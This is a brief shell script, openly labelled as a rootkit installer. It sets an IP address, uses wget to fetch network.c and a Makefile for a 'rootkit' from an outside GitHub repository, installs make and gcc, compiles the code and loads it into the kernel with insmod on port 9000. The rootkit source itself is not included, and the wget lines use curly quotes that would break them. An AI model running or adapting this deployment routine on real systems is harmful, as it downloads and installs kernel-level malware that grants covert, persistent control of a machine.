#/bin/sh

echo "ip add"
sudo ip addr add 192.168.100.2/24 dev ens4 

mkdir rootkit
cd rootkit

echo "rootkit download"
wget “https://raw.githubusercontent.com/lutetejunior/rootkit/main/network.c” 

wget “https://raw.githubusercontent.com/lutetejunior/rootkit/main/Makefile” 


echo "install make and gcc"
sudo apt install make 

sudo apt install gcc   

echo "make running"
make 

echo "insert of module rootkit"
sudo insmod network.ko port=9000 